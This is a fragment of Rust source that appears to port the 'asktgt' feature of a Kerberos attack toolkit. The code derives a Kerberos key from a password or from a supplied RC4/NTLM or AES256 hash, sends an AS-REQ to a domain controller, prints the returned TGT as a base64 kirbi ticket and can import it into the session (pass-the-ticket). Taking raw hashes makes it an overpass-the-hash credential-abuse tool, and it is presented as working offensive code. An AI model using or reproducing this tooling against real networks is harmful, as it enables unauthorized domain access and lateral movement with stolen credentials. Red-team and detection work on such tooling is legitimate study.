        match get_domain_info() {
            Some((d, c)) => {
                let domain = domain_arg.map(String::from).unwrap_or(d);
                let dc = dc_arg.map(String::from).unwrap_or(c);
                (domain, dc)
            }
            None => {
                eprintln!("[X] Could not retrieve domain information! Use /domain: and /dc:");
                return;
            }
        }
    };

    let api = match load_crypt_api() {
        Some(a) => a,
        None => { eprintln!("[X] Failed to load crypto modules"); return; }
    };

    let (key, etype) = if let Some(pw) = password {
        let et = match enc_override {
            Some("aes256") => AES256_CTS,
            _ => RC4_HMAC,
        };
        let salt = if et == RC4_HMAC {
            String::new()
        } else {
            let mut s = String::new();
            for c in domain.chars() { s.push(c.to_ascii_uppercase()); }
            for c in user.chars() { s.push(c); }
            s
        };
        match derive_key(&api, et, pw, &salt) {
            Some(k) => (k, et),
            None => { eprintln!("[X] Failed to derive key from password"); return; }
        }
    } else if let Some(h) = rc4_hash {
        match hex_decode(h) {
            Some(k) if k.len() == 16 => (k, RC4_HMAC),
            _ => { eprintln!("[X] Invalid RC4 hash (expected 32 hex chars)"); return; }
        }
    } else if let Some(h) = aes256_hash {
        match hex_decode(h) {
            Some(k) if k.len() == 32 => (k, AES256_CTS),
            _ => { eprintln!("[X] Invalid AES256 hash (expected 64 hex chars)"); return; }
        }
    } else {
        eprintln!("[X] No credential supplied"); return;
    };

    println!("[*] Building AS-REQ (w/ preauth) for: '{}\\{}'", domain, user);

    let as_req = match build_as_req(&api, user, &domain, &key, etype, !nopac) {
        Some(r) => r,
        None => { eprintln!("[X] Failed to build AS-REQ"); return; }
    };

    let response = match send_to_kdc(&dc, &as_req) {
        Some(r) => r,
        None => { eprintln!("[X] Failed to communicate with KDC at {}:88", dc); return; }
    };

    match handle_as_rep(&api, &response, &key, etype) {
        Some(ticket_b64) => {
            println!("[+] TGT request successful!");
            println!("[*] base64(ticket.kirbi):\n\n{}\n", ticket_b64);

            if ptt {
                println!("[*] Importing ticket...");
                import_ticket(&ticket_b64);
            }
        }
        None => {}
    }
}
